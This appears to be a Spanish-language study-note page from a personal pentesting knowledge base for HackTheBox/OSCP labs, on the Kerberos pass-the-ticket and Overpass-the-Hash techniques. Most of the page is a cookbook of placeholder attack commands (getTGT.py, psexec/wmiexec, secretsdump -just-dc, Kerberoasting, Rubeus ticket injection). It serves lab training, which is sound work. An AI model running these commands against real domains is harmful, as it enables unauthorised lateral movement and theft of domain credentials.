# Técnica: pass the ticket

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**3 máquina(s)** mencionan esta técnica.

Alias buscados: `pass-the-ticket`, `ptt`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<DC_IP>` · `<DOMINIO>` · `<USER>` · `<NTHASH>`

### Los tres escenarios

| Situación | Qué usar |
|---|---|
| Tenés hash NTLM, NTLM funciona | [[pass-the-hash]] |
| Tenés hash NTLM, NTLM **deshabilitado** | **Overpass-the-Hash** (abajo) |
| Tenés un `.ccache` o `.kirbi` | Pass-the-Ticket directo |

### Overpass-the-Hash: de hash NTLM a tique Kerberos

```bash
# Con hash
getTGT.py <DOMINIO>/'<USER>' -hashes :<NTHASH> -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache

# Con clave AES (mejor: evita RC4, que puede estar deshabilitado)
getTGT.py <DOMINIO>/'<USER>' -aesKey <AES_KEY> -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache

# Con contraseña
getTGT.py <DOMINIO>/'<USER>':'<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
```

### Usar el tique

```bash
export KRB5CCNAME=<USER>.ccache

# Verificar que sirve
klist

# Impacket — el -k usa el tique, -no-pass porque no hay contraseña
psexec.py -k -no-pass <host>.<dominio>
wmiexec.py -k -no-pass <host>.<dominio>
secretsdump.py -k -no-pass <DC>.<dominio> -just-dc

# NetExec
/usr/bin/nxc smb <IP> -u '<USER>' -d <DOMINIO> -k --use-kcache
/usr/bin/nxc winrm <IP> -u '<USER>' -d <DOMINIO> -k --use-kcache
/usr/bin/nxc ldap <DC_IP> -u '<USER>' -d <DOMINIO> -k --use-kcache --kerberoasting k.txt

# evil-winrm con Kerberos (requiere /etc/krb5.conf correcto)
evil-winrm -i <host>.<dominio> -r <DOMINIO>
```

### Convertir formatos de tique

```bash
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

### Ruby / Rubeus (desde un host Windows)

```powershell
Rubeus.exe asktgt /user:<USER> /rc4:<NTHASH> /ptt
Rubeus.exe ptt /ticket:<base64>
Rubeus.exe klist
```

### Errores típicos

| Error | Causa |
|---|---|
| `KRB_AP_ERR_TKT_EXPIRED` | El tique caducó o el reloj está mal |
| `KRB_AP_ERR_SKEW` | Desincronización de reloj → `sudo ntpdate <DC_IP>` |
| `Server not found in Kerberos database` | El DNS no resuelve el SPN |
| `Invalid argument` con `-k` | Falta `export KRB5CCNAME` o el path está mal |
| Falla solo con `-k` | `/etc/krb5.conf` mal → ver [[Entorno]] |

> **Regla**: Kerberos necesita el **nombre** del host, no la IP. Si el DNS no
> resuelve `<host>.<dominio>`, no va a funcionar. Agregalo a `/etc/hosts`.

## Referencias

- [[WADComs|WADComs (espejo local)]] — https://wadcoms.github.io/

---

## Máquinas

- [[htb-scrambled-win\|Scrambled [From Windows]]] — 3 mención(es)
- [[htb-ghost\|Ghost]] — 2 mención(es) · Windows · Insane
- [[htb-support\|Support]] — 1 mención(es) · Windows · Easy

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'pass the ticket' -v
python3 _sistema/herramientas/buscar.py 'pass the ticket' -v --oscp
```
